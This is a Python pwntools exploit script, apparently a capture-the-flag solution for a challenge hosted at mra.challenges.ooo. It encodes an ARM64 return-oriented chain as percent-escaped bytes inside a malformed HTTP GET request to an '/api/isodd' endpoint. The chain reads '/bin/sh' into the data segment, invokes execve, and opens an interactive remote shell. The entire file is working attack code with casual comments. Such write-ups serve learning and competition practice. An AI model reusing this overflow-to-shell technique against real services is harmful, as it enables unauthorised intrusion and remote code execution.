from pwn import *

context.arch = "arm"
context.bits = 64

portbase = 1
port = portbase + 10000

# converts an int like 0x400 to a properly setup string like %00%04%00%00%00%%00%00%00
# Remember when I said the authors were nice?
def a2pp(addr):
    txtaddr = str(hex(addr))[2:]
    sep = [bytes(txtaddr[i:i+2], "utf-8") for i in range(0, len(txtaddr), 2)]
    new = list(map(lambda l: b"%" + l.rjust(2, b"0"), reversed(sep)))
    while len(new) < 8:
        new.append(b"%00")
    return b"".join(new)

pad = b""
pad += b"%41%41%41%4a" # this is truly just padding
pad += a2pp(0x00) # NULL 
pad += a2pp(0x00) # NULL
pad += a2pp(0x41d184) # "/bin/sh\x00" address
pad += a2pp(0xdd) # syscall num for execve
pad += a2pp(0x4141414141414146) # dummy, this is discarded
pad += a2pp(0x004085a8) # sp - 8 -> sp - 0x38 -> regs x8, 0,1,2,3,4,5 && syscall
pad += a2pp(0x4141414141414146) # also discarded
pad += a2pp(0x9) # 9 bytes to read, length of binsh + newline (so could be 8 I guess)
pad += a2pp(0x41d184) # Address in data segment to read string into
pad += a2pp(0x0000000000000000) # # Also discarded....see a pattern?
payload = b""
payload += a2pp(0x6666666666666666) # dummy
payload += a2pp(0x00406510) 
payload += a2pp(0x5555555555555555) # dummy
payload += a2pp(0x4444444444444444) # dummy
payload += a2pp(0x3333333333333333) # dummy
payload += a2pp(0x2222222222222222) # dummy
xrep = pad + payload
# Ugly because it's just from the fuzzer and I didn't really change anything. lol
content = b"GET /api/isodd/1236%\x00\x008936%pris%d6666666>" + xrep + b"VVVV/666666!666666666666666666666666666666666666666api/666666666666666666666666666666F6666666666666@66666666666666666666666666666\x15????pris?\x16\x1636%\x00%%%%'%\x7f%%B6\x03"

# This isn't really necessary
content += b"1" * (0x3ff - len(content))

r = remote("mra.challenges.ooo", 8000)
print()
print("Sending ", content)
r.send(content)
r.sendline(b"/bin/sh\x00")
# Shell!
r.interactive()
